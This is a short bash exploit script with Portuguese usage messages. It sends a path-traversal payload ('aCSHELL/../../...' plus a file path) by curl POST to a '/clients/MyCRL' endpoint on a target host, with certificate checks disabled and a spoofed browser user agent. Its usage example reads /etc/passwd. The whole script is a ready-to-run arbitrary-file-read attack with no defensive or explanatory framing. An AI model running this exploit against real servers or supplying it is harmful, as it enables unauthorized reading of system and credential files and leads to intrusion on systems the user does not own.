#!/bin/bash

exec=$(echo $0 | rev | cut -d '/' -f1 | rev)

if [ $# -ne 2 ]
then
        echo "Numero de parametros incorreto"
        echo "Forma de uso: "
        echo -e "\t $exec HOST ARQUIVO"
        echo -e "\t $exec 127.0.0.1 /etc/passwd"
        exit 1
fi

host="https://$1"
arquivo=$2
payload="aCSHELL/../../../../../../../../..$arquivo"
tamanho=${#payload}

curl -H "Content-Length: $tamanho" -A "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" -s -X POST -d "$payload" "$host/clients/MyCRL" -k
